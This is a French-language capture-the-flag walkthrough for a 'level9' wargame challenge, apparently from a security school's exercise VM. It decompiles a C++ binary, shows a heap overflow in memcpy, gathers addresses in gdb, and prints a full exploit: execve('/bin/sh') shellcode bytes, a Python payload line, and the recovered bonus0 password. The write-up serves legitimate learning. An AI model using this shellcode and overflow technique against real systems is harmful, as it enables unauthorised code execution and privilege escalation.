# LEVEL 9
## Walkthrough

Voici les étapes suivit pour accéder au niveau supérieur, soit le `bonus0`.

1. Une fois connecté à la VM sur le `level9`, l'on retrouve un fichier `level9` situé à la racine du dossier utilisateur. Ce dernier s'avère être de nouveau un exécutable ELF (Executable and Linkable Format).

2. On extrait ce fichier sur la machine host soit en utilisant la commande `scp` soit en utilisant un logiciel créer à cet effet.

	```sh
	> scp -P 4242 level9@127.0.0.1:level9 /path/on/machine/host
	```

3. On ouvre ensuite ce fichier dans Ghidra et après analyse, on obtient le désassemblage ci-dessous (que l'on refactorise pour plus de clarté).

    ```sh
    #include <cstring>
    #include <cstdlib>

    class N {
    	private:
    		int		m_Value;
    		char	m_Annotation[100];

    	public:

    		N(int n) : m_Value(n) {}

    		int		operator+(N& n) {
    			return m_Value + n.m_Value;
    		}

    		int		operator-(N& n) {
    			return m_Value - n.m_Value;
    		}

    		void	setAnnotation(char* annotation) {
    			std::memcpy(m_Annotation, annotation, std::strlen(annotation));
    		}
    };

    int main(int argc, char** argv)
    {
    	if (argc < 2) {
    		return EXIT_FAILURE;
    	}

    	N* n1 = (N*) new N(5);
    	N* n2 = (N*) new N(6);

    	n1->setAnnotation(argv[1]);
    	(*n1 + *n2);

    	return EXIT_SUCCESS;
    }
    ```
   Avant toute chose, l'on constate que le désassemblage ci-dessus est en `CPP/C++` et non pas `C` comme dans les niveaux précédents.

   De ce fait, le programme définit en premier lieu une classe `N` avec les membres suivants :
    - `m_Value` : Un entier privé qui stocke une valeur ;
    - `m_Annotation` : Un tableau de caractères de 100 caractères privé.

    De plus, la classe `N` possède les fonctions membres suivantes :
    - Un constructeur : Prends un entier `n` de type `int` et qui initialise `m_Value` avec cette valeur ;
    - Un `operator+` : Surcharge de l'opérateur d'addition qui permet d'additionner deux objets de la classe `N` en additionnant leurs `m_Value` ;
    - Un `operator-` : Surcharge de l'opérateur de soustraction qui permet de soustraire deux objets de la classe `N` en soustrayant leurs `m_Value` ;
    - La fonction `setAnnotation` : Une fonction qui prend un pointeur vers une chaîne de caractères, soit `char* annotation`, et copie cette chaîne dans le tableau `m_Annotation` en utilisant `std::memcpy` et `std::strlen`.

    Mise à part cette classe, le programme ne définit qu'une seule autre fonction : la fonction `main` avec comme paramètres les arguments `argc` et `argv`. Cette dernière commence par vérifier si le nombre d'arguments dans la ligne de commande est inférieur à 2 (`argc < 2`). Si c'est le cas, le programme renvoie EXIT_FAILURE, indiquant une sortie d'erreur. Dans le cas contraire, la fonction `main` instancies 2 objets de classe `N`, soit `n1` et `n2`, avec les valeurs `5` et `6`, respectivement. Pour continuer, la fonction `setAnnotation` de `n1` est appelée avec l'argument `argv[1]` afin de copier cette chaîne de caractères dans `m_Annotation`. Une opération d'addition est ensuite effectuée entre `n1 `et `n2`, mais le résultat n'est pas stocké ni utilisé. Enfin, le programme renvoie `EXIT_SUCCESS`, indiquant une sortie réussie.

    En conclusion, l'on peut cependant noter que certaines parties du code sont peu sécurisées et peuvent ainsi nous permettre d'exploiter ce programme.

4. Le code `level9` ne propose pas de fonction directe pour lancer un shell interactif ou afficher le contenu du fichier `.pass` du niveau suivant. Il faudra donc utiliser un `shellcode` déjà éprouvé, capable d'exécuter la commande `("/bin/sh")`, pour atteindre cet objectif. Pour ce faire, l'on va chercher à exploiter la fonction `std::memcpy` située dans la méthode `setAnnotation`. En provoquant un `buffer overflow`sur le paramètre `char *annotation`, l'on peut manipuler la pile d'exécution, rediriger le flux de contrôle vers notre `shellcode` et ainsi exécuter un shell interactif.

    Code shellcraft :
    ```sh
	"\x31\xc0\x50\x68\x2f\x2f\x73"
	"\x68\x68\x2f\x62\x69\x6e\x89"
	"\xe3\x89\xc1\x89\xc2\xb0\x0b"
	"\xcd\x80\x31\xc0\x40\xcd\x80"
	```

	Lien : https://shell-storm.org/shellcode/files/shellcode-811.html

5. Dans un premier temps, nous allons récupérer l'adresse de la fonction membre `setAnnotation` en lançant `gdb` sur l'exécutable `level9` et la commande `disas main`.

    ```sh
    > gdb level9
    > (gdb) disas main
	Dump of assembler code for function main:
		[...]
		0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
		[...]
	End of assembler dump.
    ```

    On obtient donc l'adresse `0x804870e` pour la fonction membre `setAnnotation`.

6. On va à présent chercher l'adresse du paramètre `char *annotation` au sein de la fonction membre `setAnnotation`. On effectue donc les étapes suivantes au sein de `gdb` :

    - On set tout d'abord un `breaking point` sur l'adresse de la fonction membre `setAnnotation` :

        ```sh
        > (gdb) b *0x804870e
    	Breakpoint 1 at 0x804870e
        ```

    - On exécute le programme en fournissant un paramètre qui sera stocké dans `char* annotation` et copié via la fonction `std::memcpy`. Pour cela, nous utilisons la commande `run` pour lancer le programme et exécutons chaque étape du code en utilisant la commande `step`. Nous continuons jusqu'à atteindre le `breaking point`.

        ```sh
        > (gdb) run AXELAXELAXELAXELAXELAXELAXELAXELAXELAXELAXELAXELAXELAXELAXELAXELAXEL
		Starting program: /home/user/level9/level9 AXELAXELAXELAXELAXELAXELAXELAXELAXELAXELAXELAXELAXELAXELAXELAXELAXEL

		Breakpoint 1, 0x0804870e in N::setAnnotation(char*) ()

		(gdb) step
		Single stepping until exit from function _ZN1N13setAnnotationEPc,
		which has no line number information.
		0x0804867c in main ()
        ```

    - Ainsi, la chaîne de caractères `char* annotation` devrait maintenant être stocker dans un registrer. On la cherche donc via la commande `info registers.

       ```sh
       > (gdb) info registers
		eax            0x804a00c	134520844
		ecx            0x0	0
		edx            0x804a050	134520912
		ebx            0x804a078	134520952
		esp            0xbffff6d0	0xbffff6d0
		ebp            0xbffff6f8	0xbffff6f8
		esi            0x0	0
		edi            0x0	0
		[...]
       ```

    - Avec un peu de chance, on suppose que le premier register `eax` contient la chaîne de caractère passé en paramètre lors du `run`. On s'en assure en examiner l'adresse `0x804a00c`.

        ```sh
        > (gdb) x/s 0x804a00c
		0x804a00c:	 "AXELAXELAXELAXELAXELAXELAXELAXELAXELAXELAXELAXELAXELAXELAXELAXELAXEL"
        ```

    Ainsi, l'adresse du paramètre `char *annotation` au sein de la fonction membre `setAnnotation` est bien `0x804a00c`.

7. Maintenant que l'on cette adresse, l'on peut passer à la création de notre `payload`.

    ```sh
    python -c "print('\x0c\xa0\x04\x08' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90' * 76 + '\x0c\xa0\x04\x08')"
    ```

    On a :
    - `'\x0c\xa0\x04\x08'`: L'adresse du paramètre `char *annotation` au sein de la fonction membre `setAnnotation` en format `little-endian` ;
    - `'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'`: Le `shellcode` permettant n'exécutant un shell interactif ;
    - `'\x90' * 76`: L'overflow nécessaire pour se retrouver à l'adresse correspondant au début du string.

8. Il manque plus qu'à lancer le programme avec le payload précédemment définie pour `buffer overflow` la fonction `std:memcpy` située dans la fonction membre `setAnnotation`, lancé notre shell interactif via notre shellcode et `cat` le fichier `/home/bonus0/.pass`. On lance au passage la commande `whoami` pour s'assurer qu'on est bien passé de `level9` a `bonus0`.

    ```sh
    > ./level9 $(python -c "print('\x0c\xa0\x04\x08' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90' * 76 + '\x0c\xa0\x04\x08')")
    > whoami
    bonus0
    > cat /home/user/bonus0/.pass
    f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
    ```

9. On peut à présent passer au niveau supérieur en exécutant la commande `su bonus0` et en y spécifiant le mot de passe qui vient d'être trouvée.

    ```sh
    > su bonus0
    Password :
    > f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
    ```
